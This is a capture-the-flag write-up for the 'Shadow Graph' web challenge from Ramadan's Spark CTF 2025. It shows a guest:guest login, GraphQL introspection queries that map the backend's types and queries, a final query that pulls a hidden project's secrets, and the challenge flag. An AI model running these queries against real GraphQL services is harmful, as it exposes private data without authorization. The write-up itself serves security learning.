---
title: "Ramadan's Spark CTF 2025 — Shadow Graph"
description: 'GraphQL introspection to leak secrets'
pubDate: 'Mar 29 2025'
tags: ['ctf', 'web', 'graphql', 'introspection']
thumbnail: 'https://miro.medium.com/v2/resize:fit:1100/1*t56uH78TltZOTpXew7qy8g.png'
---

# Shadow Graph

<img src="https://miro.medium.com/v2/resize:fit:1100/1*t56uH78TltZOTpXew7qy8g.png" alt="Shadow Graph challenge" />

Upon opening the web application, we are presented with a login page. We try the credentials `guest:guest` and successfully log in.

Exploring the application, we discover a `/graphql` directory, indicating that the web app utilizes a GraphQL API.

To enumerate all GraphQL types supported by the backend, we can use the following query:

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

We get a result containing basic default types, such as `Int` or `Boolean`, but also all custom types, such as `Project` & `Secret`:

<img src="https://miro.medium.com/v2/resize:fit:1100/1*EDO3w-6xG_S17x0xMI3h8A.png" alt="GraphQL schema types" />

Now that we have identified a type, we can proceed to enumerate its fields using the following introspection query:

```graphql
{
  __type(name: "Secret") {
    name
    fields {
      name
    }
  }
}
```

The response reveals the details of the `Secret` object, including its fields:

<img src="https://miro.medium.com/v2/resize:fit:1100/1*TJJP23XejX1VkOy7HPwq6A.png" alt="Secret type fields" />

Furthermore, we can enumerate all queries supported by the backend:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

<img src="https://miro.medium.com/v2/resize:fit:1100/1*ei5Pf9g0ivn7gfqcbDBgtg.png" alt="Available queries" />

Now that we have all the information we need, we can craft our payload to get the flag:

```graphql
{
  project(id: "3") {
    id
    name
    isSecret
    secrets {
      id
      name
      content
    }
  }
}
```

<img src="https://miro.medium.com/v2/resize:fit:1100/1*_e-ftGRWDIaifq-nlFa91g.png" alt="Flag extraction" />

**Flag:** `Spark{F4st1ng_Is_G00d_But_Exp0sIng_Qu3r13s_Is_N0t}`
